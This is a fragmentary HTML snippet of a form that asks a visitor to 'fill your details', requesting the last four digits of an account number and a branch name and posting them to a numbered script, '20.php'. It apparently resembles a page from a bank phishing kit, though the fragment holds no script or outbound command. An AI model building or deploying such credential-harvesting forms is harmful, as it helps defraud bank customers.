...
<body>
    ...
    width:345px;
    height:55px;"
    > Please fill your details.<br></h3>
   
     Last 4 Digit Account No
    </div>
 <form action="20.php" method="post">
    <div id="cc">
        <input type="text" name=" Enter Last 4 Digit Account No" id="Enter Last 4 Digit Account No" required=""> <br><br>
    </div>
    ...
    <div id="cc">
        <input type="text" name="Branch Name" id="dd" required=""> <br><br>
    </div>
